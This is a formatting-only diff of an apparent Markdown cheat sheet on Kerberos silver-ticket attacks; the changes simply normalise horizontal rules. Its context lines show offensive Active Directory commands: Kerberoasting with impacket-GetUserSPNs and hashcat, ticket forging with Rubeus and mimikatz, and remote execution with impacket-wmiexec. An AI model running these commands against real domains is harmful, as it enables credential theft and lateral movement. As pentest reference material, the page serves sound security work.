@@ -16,7 +16,7 @@ linked:
 
 # Silver Ticket - Tooling
 
-***
+---
 
 ## impacket-ticketer (silver mode)
 
@@ -44,7 +44,7 @@ impacket-ticketer \
 export KRB5CCNAME=administrator.ccache
 ```
 
-___
+---
 
 ## impacket-GetUserSPNs
 
@@ -61,7 +61,7 @@ impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local -request -output
 hashcat -m 13100 kerb.txt rockyou.txt
 ```
 
-___
+---
 
 ## Rubeus silver
 
@@ -83,7 +83,7 @@ ___
   /ldap /endin:600 /ptt /opsec
 ```
 
-___
+---
 
 ## mimikatz kerberos::golden (silver mode)
 
@@ -101,7 +101,7 @@ mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21
 mimikatz # misc::cmd
 ```
 
-___
+---
 
 ## impacket post-silver (uso del ticket)
 
@@ -120,7 +120,7 @@ klist
 impacket-wmiexec -k -no-pass corp.local/administrator@web01.corp.local
 ```
 
-___
+---
 
 ## Recursos
 
@@ -134,4 +134,4 @@ ___
 | MITRE ATT&CK T1558.002 | `https://attack.mitre.org/techniques/T1558/002/` |
 ^st-tool-resources
 
-***
+---
